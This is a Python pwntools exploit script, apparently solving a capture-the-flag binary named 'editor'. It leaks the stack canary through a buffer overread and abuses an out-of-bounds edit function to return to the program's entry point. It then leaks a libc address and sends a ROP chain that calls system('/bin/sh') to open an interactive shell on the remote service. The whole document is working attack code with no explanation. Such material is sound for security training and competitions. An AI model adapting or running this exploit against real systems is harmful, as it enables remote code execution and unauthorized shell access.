from pwn import *
from sys import *

elf = ELF("./editor")
libc = ELF("./libc-2.31.so")
p = process("./editor")

HOST = "editor.litctf.live"
PORT = 1337

cmd = """
b*0x00000000004012e0
b*edit+91
b*0x00000000004013ad
"""

if(argv[1] == 'gdb'):
    gdb.attach(p,cmd)
elif(argv[1] == 'rm'):
    p = remote(HOST,PORT)

def edit(index,char):
    sleep(0.05)
    p.sendline(b'1')
    p.sendlineafter("change!\n", str(index))
    p.sendlineafter("it to!\n", char)

def view():
    p.sendlineafter("to do?\n", b'2')


payload = b'A'*0x89
p.sendafter(":\n", payload)
view()
p.recvuntil('A'*0x88)
canary = u64(p.recvn(8))
print(hex(canary))

start = p64(elf.entry)

for i in range(8):
    print(i)
    edit(0x90+i,b'X')

for i in range(8):
    print(i)
    edit(0x98+i,chr(start[i]))



edit(0x9b,b'A')
edit(0x9c,b'A')
edit(0x9c,b'\x00')
edit(0x9b,b'\x00')
#edit initialize
edit(-0x20,b'\x00')
#bring back canary
edit(0x88,b'\x00')

#exit
p.sendlineafter("to do?\n", b'3')

payload2 = b'A'*0x88
payload2 += p64(canary)
payload2 += b'X'*8
p.sendafter(":\n", payload2)
view()
p.recvuntil(b'X'*0x8)
leak = u64(p.recvn(6)+b'\x00'*2)
print(hex(leak))

libc.address = leak - 0x26d0a
one_gadget = p64(libc.address + 0xcbd20)
print(hex(libc.address))

for i in range(8):
    edit(0x90+i,b'X')

for i in range(8):
    edit(0x98+i,chr(start[i]))



edit(0x9b,b'A')
edit(0x9c,b'A')
edit(0x9c,b'\x00')
edit(0x9b,b'\x00')
#edit initialize
edit(-0x20,b'\x00')
#bring back canary
edit(0x88,b'\x00')

#gdb.attach(p,cmd)

#bring back canary
edit(0x88,b'\x00')
#exit
p.sendlineafter("to do?\n", b'3')

payload3 = b'A'*0x88
payload3 += p64(canary)
payload3 += b'X'*8
payload3 += p64(0x000000000040140b)
payload3 += p64(next(libc.search(b'/bin/sh\x00')))
payload3 += p64(libc.sym['system'])
p.sendafter(":\n", payload3)

#bring back canary
edit(0x88,b'\x00')

p.interactive()
